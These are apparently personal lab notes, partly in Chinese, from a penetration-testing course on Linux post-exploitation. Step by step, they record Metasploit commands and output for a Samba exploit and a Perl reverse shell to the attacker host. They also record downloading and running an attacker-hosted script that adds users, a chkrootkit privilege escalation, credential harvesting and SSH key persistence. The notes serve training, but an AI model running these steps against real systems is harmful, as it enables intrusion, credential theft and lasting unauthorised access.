# Linux Post Exploitation
## Post Exploitation Lab I
	=> file-sharing service on a Linux server
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	nmap -sV -sC demo.ine.local
		139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
		445/tcp open  netbios-ssn Samba smbd 4.1.17 (workgroup: WORKGROUP)
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	msfconsole -q
		search linux samba
		use exploit/linux/samba/is_known_pipename
		set RHOST demo.ine.local
		check
	[+] 192.49.88.3:445 - Samba version 4.1.17 found with writeable share 'exploitable'
	[*] 192.49.88.3:445 - The target appears to be vulnerable.
 		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		run
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	use post/multi/manage/shell_to_meterpreter
		set SESSION 2
		run
		[*] Meterpreter session 2 opened (192.21.142.2:4433 -> 192.21.142.3:57508) 
	  	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		sessions 3
		meterpreter >
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	use post/linux/gather/enum_configs
		set SESSION 2
  
		[[+] shells (/etc/shells: valid login shells)
		[+] sepermit.conf (/etc/security/sepermit.conf)
		[+] ca-certificates.conf (/etc/ssl/certs)
		[+] access.conf Login access control table
		[+] rpc stored in 
		[+] ldap.conf 
		[+] sysctl.conf
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	use post/multi/gather/env
		set SESSION 2
		run
  
		PWD=/tmp
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	use post/linux/gather/enum_network
		set SESSION 2
		run
  
	[+] DNS config 
	nameserver 127.0.0.11
	search members.linode.com
	options edns0 trust-ad ndots:0

	# Based on host file: '/etc/resolv.conf' (internal resolver)
	[+] Host file 
	[+] SSH keys 
	[+] If-Up/If-Down 
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	use post/linux/gather/enum_protections
		set SESSION 2
		run
	[*] Finding system protections...
	[+] ASLR is enabled
	[+] SMEP is enabled
	[+] SMAP is enabled
	[+] Yama is installed and enabled
	[*] Finding installed applications...
	[+] iptables found: /sbin/iptables
	[+] tcpdump found: /usr/sbin/tcpdump
	[+] wireshark found: /usr/bin/wireshark

	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	use post/linux/gather/enum_system
		set SESSION 2
		run

	[*] Linux version
	[*] User accounts 
	[*] Installed Packages 
	[*] Running Services 
	[*] Cron jobs 
	[*] Disk info
	[*] Logfiles
	[*] Setuid/setgid files
	[*] CPU Vulnerabilities 
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	use post/linux/gather/checkcontainer
		set SESSION 2
		run

	[+] This appears to be a 'Docker' container

	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	use post/linux/gather/checkvm
		set SESSION 2
		run

	[!] SESSION may not be compatible with this module:
	[!]  * incompatible session platform: unix. This module works with: Linux.
	[*] Gathering System info ....
	[*] This does not appear to be a virtual machine

	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	use post/linux/gather/enum_users_history
		set SESSION 2
		run
	[+] Last logs 
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	use post/multi/manage/system_session
		set SESSION 2
		set LHOST 192.49.88.2
		run

	[*] Perl was found on target
	[*] Perl reverse shell selected
	[*] Executing reverse tcp shell to 192.49.88.2 on port 4433

	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	(ADD user)
	nano test.sh
		useradd hacker
		useradd test
		useradd nick
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		/etc/init.d/apache2 start
		cp test.sh /var/www/html
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	use post/linux/manage/download_exec
		set SESSION 2
		set URL http://192.49.88.2/test.sh
		run
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		(prove)
		sessions -i 2
		cat /etc/passwd

## Privilege Escalation-Rootkit Scanner
	=> vulnerable Rootkit Scanner
	| Username | Password | | jackie | password |

	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	nmap -sV -sC demo.ine.local
		22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	msfconsole -q
		use auxiliary/scanner/ssh/ssh_login
		set RHOSTS demo.ine.local
		set USERNAME jackie
		set PASSWORD password
		exploit
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		sessions -i 1 
		[*] Starting interaction with 1...
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	檢查正在運行的服務 : 
		ps aux
		root          37  0.0  0.0   9924  2304 ?        S    06:20   0:00 /bin/bash /bin/check-down
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		研究檢查 bash 腳本
		cat /bin/check-down
	 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		#!/bin/bash
		while :
		do
			/usr/local/bin/chkrootkit/chkrootkit -x > /dev/null 2>&1
			sleep 60
		done
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	檢查 chkrootkit 位置及其版本
		command -v chkrootkit
		/bin/chkrootkit
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		/bin/chkrootkit -V
		chkrootkit version 0.49
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		searchsploit chkrootkit 0.49
			Chkrootkit - Local Privilege Escalation (Metasploit)       
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		search Chkrootkit - Local Privilege Escalation 
			use exploit/unix/local/chkrootkit
			set CHKROOTKIT /bin/chkrootkit
			set session 1
			set LHOST 192.237.219.2
			exploit
			meterpreter > cat /root/flag
## Post Exploitation Lab II
	nmap -sV -sC demo.ine.local
		139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
		445/tcp open  netbios-ssn Samba smbd 4.1.17 (workgroup: WORKGROUP)
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	msfconsole -q 
		search linux samba
		use exploit/linux/samba/is_known_pipename
		set RHOST demo.ine.local
		check
		run
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	use post/multi/gather/ssh_creds
		set SESSION 1

	[+] Downloaded /root/.ssh/id_rsa 
	[-] Could not load SSH Key: invalid curve name
	[+] Downloaded /root/.ssh/id_rsa.pub 
	[+] Downloaded /root/.ssh/known_hosts 
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	use post/multi/gather/docker_creds
		set SESSION 1

	[*] Downloading /root/.docker/config.json 
	[+] Found attackdefence:Str0ngPassword@123
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	use post/linux/gather/hashdump
		set SESSION 1
		set VERBOSE true

	[+] passwd
	[+] Shadow 
	[+] opasswd
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	use post/linux/gather/ecryptfs_creds
		set SESSION 1

	[*] Downloading /root/.ecryptfs/sig-cache.txt 
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	use post/linux/gather/enum_psk
		set SESSION 1

	802-11-wireless-security
	========================

	 AccessPoint-Name    PSK
	 ----------------    ---
	 Wi-Fi connection 1  AttackDefence_WiFi_123321
	 Wi-Fi connection 2  Free_Internet

	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	use post/linux/gather/enum_xchat
		set SESSION 1
		set XCHAT true

	[+] servlist_.conf 
	[+] xchat.conf 
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	use post/linux/gather/phpmyadmin_credsteal
		set SESSION 1

	[+] PhpMyAdmin config found!
	[+] Extracting creds
	[+] User: root
	[+] Password: N0tE@syT0Guess!!
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	use post/linux/gather/pptpd_chap_secrets
		set SESSION 1

	 Client  Server                Secret          IP
	 ------  ------                ------          --
	 jackie  attackdefense.com     HiddenNetwork   10.10.10.10
	 ninja   pentesteracademy.com  LearningIsReal  216.146.39.125
	 peter   underground.onion     ReallySecure!!  246.234.63.133
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	use post/linux/manage/sshkey_persistence
		set SESSION 1

	[+] Storing new private key 
## Establishing Persistence On Linux
	建立持久存取
	| Username | Password | | jackie | password |
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	nmap -sV -sC demo.ine.local
		22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	msfconsole -q
		use auxiliary/scanner/ssh/ssh_login
		set RHOSTS demo.ine.local
		set USERNAME jackie
		set PASSWORD password
		exploit
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		shell 
		command -v chkrootkit
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	upgrade this command shell session to a meterpreter session !!!!!!!!!!!
		=> sessions -u 1
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	提升目標系統上的權限 : 
	use exploit/unix/local/chkrootkit
		set SESSION 2
		set CHKROOTKIT /bin/chkrootkit
		set LHOST 192.128.97.2
		exploit
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		meterpreter > ctrl z 
		sessions -u 3
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	建立持久性: 
	=> 將在所有使用者和服務帳戶主目錄下的authorized_keys檔案中新增SSH公鑰
	use post/linux/manage/sshkey_persistence
		set SESSION 4
		set CREATESSHFOLDER true
		exploit
	[+] Storing new private key as /root/.msf4/loot/20250116130125_default_192.128.97.3_id_rsa_986456.txt
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	要使用私鑰，請複製金鑰並將其儲存為新文件: 
		cp /root/.msf4/loot/20250116130125_default_192.128.97.3_id_rsa_986456.txt ssh_key
		chmod 0400 ssh_key
	ssh -i ssh_key root@demo.ine.local
		root@demo:~# 

